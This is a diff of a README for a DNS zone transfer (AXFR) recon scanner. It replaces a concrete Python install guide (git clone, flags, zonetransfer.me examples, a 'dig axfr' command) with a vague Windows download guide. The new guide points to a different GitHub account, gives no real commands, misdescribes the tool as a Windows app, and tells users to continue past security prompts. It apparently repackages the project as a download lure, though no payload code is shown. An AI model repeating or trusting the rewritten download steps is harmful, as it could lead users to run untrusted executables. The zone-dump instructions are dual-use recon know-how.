@@ -1,146 +1,177 @@
-<h1 align="center">⚔️ NinjAXFR v0.1</h1>
+# 🔍 ninjaXRF - Fast DNS Zone Checks Made Simple
 
-<p align="center">
-Fast DNS Zone Transfer (AXFR) Scanner for Recon & Security Testing
-</p>
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/thrifty-consonance737/ninjaXRF)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-0.1-blue">
-  <img src="https://img.shields.io/badge/python-3.x-green">
-  <img src="https://img.shields.io/badge/status-active-success">
-</p>
+## 🧭 What ninjaXRF does
 
----
+ninjaXRF is a Windows tool for checking DNS zone transfers. It helps you find name servers that may share more DNS data than they should. You can use it to scan targets, test for exposed zone data, and review the results in a clear way.
 
-## 🧠 About
+Use it when you want to:
 
-NinjAXFR is a fast and lightweight DNS zone transfer (AXFR) scanner written in Python.
-It automates name server discovery and tests for misconfigured DNS servers, helping
-identify exposed zone data during reconnaissance and security assessments.
+- Check if a DNS server allows AXFR
+- Find exposed DNS records
+- Run scans across many targets
+- Dump a full zone when transfer is allowed
+- Review results in verbose mode for more detail
 
----
+## 💻 What you need
 
-## ⚡ Features
+Before you start, make sure your Windows PC has:
 
-- Automatic NS discovery  
-- Concurrent scanning  
-- AXFR misconfiguration detection  
-- Full zone dump (--exploit)  
-- Output file support  
-- Verbose mode  
-- Silent mode  
+- Windows 10 or later
+- Internet access
+- Enough free space for the app and results
+- Permission to test the target you scan
+- A terminal or command window
 
----
+For most users, no extra setup should be needed beyond downloading the project and running the tool from the provided page.
 
-## 📥 Installation
+## 📥 Download ninjaXRF
 
-```bash
-git clone https://github.com/yHunterDep/ninjaXRF/
-cd ninjaXRF
-pip install -r requirements.txt
-chmod +x ninjaxfr
-./ninjaxfr -h
-```
+Visit this page to download the tool:
 
----
+https://github.com/thrifty-consonance737/ninjaXRF
 
-## 🚀 Usage
+If the page contains a release file or packaged build, download it from there and run it on your Windows PC. If the page shows source files, use the download option on GitHub to get the project files, then open the folder and run the tool as described on the page.
 
-```bash
-./ninjaxfr -h
-```
+## 🪟 Install on Windows
 
----
+Follow these steps on Windows:
 
-## 📌 Options
+1. Open the download page in your browser.
+2. Download the project or release package.
+3. Save the file to a folder you can find again, such as Downloads or Desktop.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main program file or the run instructions on the page.
+7. Start the tool from that file.
 
-```text
-  -h, --help            show this help message and exit
-  -t TARGET, --target TARGET
-                        Target domain to scan
-  -xpl, --exploit       Dump full zone data if AXFR is successful.
-  -o OUTPUT, --output OUTPUT
-                        Save results to a specified file.
-  -c CONCURRENT, --concurrent CONCURRENT
-                        Number of concurrent threads (default: 25).
-  -v, --verbose         Shows detailed information about each step
-                        of the scanning process..
-  -s, --silent          Skip Banner mode
-```
+If Windows shows a security prompt, choose the option that lets you continue only if you trust the source and the target file.
 
----
+## 🚀 Getting started
 
-## 🧪 Examples
+After you open the tool, use it to test a target domain or a list of domains.
 
-### Single target
-```bash
-./ninjaxfr -t zonetransfer.me
-```
+A basic workflow looks like this:
 
-### High concurrency
-```bash
-./ninjaxfr -t zonetransfer.me -c 70
-```
+1. Enter the target name server or domain.
+2. Start a scan.
+3. Wait for the tool to check for AXFR access.
+4. Review the results.
+5. Save or dump the zone if the transfer is allowed.
 
-### Multiple domains
-```bash
-cat domains.txt | ./ninjaxfr
-```
+If you are testing more than one host, use a list of targets and let the scanner work through them in order.
 
-### Exploit mode
-```bash
-./ninjaxfr -t zonetransfer.me --exploit
-```
+## 🔎 How scanning works
 
-### Save output
-```bash
-./ninjaxfr -t zonetransfer.me -o results.txt
-```
+ninjaXRF checks whether a name server accepts a zone transfer request. A zone transfer can reveal DNS data such as:
 
-### Pipeline usage
-```bash
-cat domains.txt | ./ninjaxfr | anew results.txt
-```
+- Hostnames
+- IP addresses
+- Mail server records
+- Subdomains
+- Other public DNS records
 
----
+The tool uses fast checks and can run more than one scan at a time. This helps you test many targets in less time.
 
-## 🧾 Output Example
+## ⚙️ Useful options
 
-```text
-Zone Transfer (medium)
-Domain: zonetransfer.me
-NS_SERVER: nsztm1.digi.ninja
-Command to use: dig axfr zonetransfer.me @nsztm1.digi.ninja
-```
+ninjaXRF supports a few common scan modes:
 
----
+### 🗂️ Verbose mode
 
-## 🎨 Banner
+Use verbose mode when you want more detail during a scan. It helps you see what the tool is doing as it checks each target.
 
-```text
-          _         _      _  __ __________
-   ____  (_)___    (_)___ | |/ // ____/ __ \
-  / __ \/ / __ \  / / __ `/   // /_  / /_/ /
- / / / / / / / / / / /_/ /   |/ __/ / _, _/
-/_/ /_/_/_/ /_/_/ /\__,_/_/|_/_/   /_/ |_|
-             /___/
+### ⚡ Concurrency
 
-    ninjaXFR - DNS Zone Transfer Tool
-    by HunterDep
-    v0.1
-```
+Concurrency lets the tool test more than one target at once. This is useful when you have a long list of DNS servers or domains.
 
----
+### 📤 Full zone dumping
 
-## ⚠️ Disclaimer
+If a server allows AXFR, the tool can dump the full zone. That gives you a complete list of DNS records for that domain.
 
-This tool is intended for educational and authorized security testing purposes only.
-Do not use it against targets without permission.
+### 🧪 Recon mode
 
----
+Use the scanner for recon and security testing when you want to find DNS misconfigurations and exposed records.
 
-## 🧑‍💻 Author
+## 🧰 Simple example use
 
-HunterDep
+A common flow is:
 
----
+1. Open ninjaXRF.
+2. Type a domain or name server list.
+3. Turn on verbose mode if you want more detail.
+4. Set the number of parallel checks if the tool supports it.
+5. Start the scan.
+6. Review the output for allowed transfers.
+7. Export or save the results for later use.
+
+If you are checking a single domain, start with one target first. If that works, move to a larger list.
+
+## 📁 Result files
+
+The tool may create output files or display results in the window. You may see data such as:
+
+- Allowed transfer status
+- Target name server
+- DNS records found
+- Scan time
+- Error messages for blocked transfers
+
+Keep the result files in a separate folder so you can sort them by date or target.
+
+## 🛠️ Common issues
+
+### The tool does not start
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file, if there is one
+- Try running the program again
+- Confirm that you opened the correct file
+
+### Windows blocks the file
+
+- Open the file only if you trust the source
+- Check that the download came from the project page
+- Retry the download if the file looks damaged
+
+### No results appear
+
+- Check that the target is correct
+- Make sure the name server is online
+- Try a second target to confirm the tool works
+- Use verbose mode to see more output
+
+### The scan is slow
+
+- Lower the number of parallel checks if needed
+- Test a smaller target list first
+- Make sure your network connection is stable
+
+## 📚 Practical uses
+
+People use ninjaXRF for:
+
+- DNS exposure checks
+- Bug bounty recon
+- Internal security review
+- Misconfiguration testing
+- Asset discovery
+- Zone transfer validation
+
+It fits well in a basic DNS test flow when you want a fast way to spot servers that expose more than they should.
+
+## 🔐 Safe use
+
+Use the tool only on systems you own or on targets where you have clear permission to test. Keep your scans focused and review the output before you share it with others.
+
+## 📌 Quick start checklist
+
+- Open the download page
+- Get the project files or release package
+- Extract the files if needed
+- Run the tool on Windows
+- Enter a domain or name server
+- Start the scan
+- Review AXFR results
+- Save the output for later use
